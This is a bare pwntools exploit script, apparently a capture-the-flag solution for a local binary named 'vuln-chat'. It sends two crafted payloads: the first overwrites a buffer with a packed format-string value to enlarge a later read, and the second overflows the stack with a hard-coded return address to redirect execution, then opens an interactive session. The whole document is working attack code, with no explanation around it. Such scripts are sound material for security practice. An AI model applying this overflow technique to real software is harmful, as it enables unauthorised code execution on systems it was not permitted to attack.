from pwn import *
pay = b""
pay += b"A" * 20
pay += p32(0x73393925) 
p = process("./vuln-chat")
p.recvuntil(b"Enter your username:")
p.sendline(pay)
pay1 = b""
pay1 += b"A" * 49
pay1 += p32(0x0804856b)
p.recvline(b"I know I can trust you?")
p.sendline(pay1)
p.interactive()
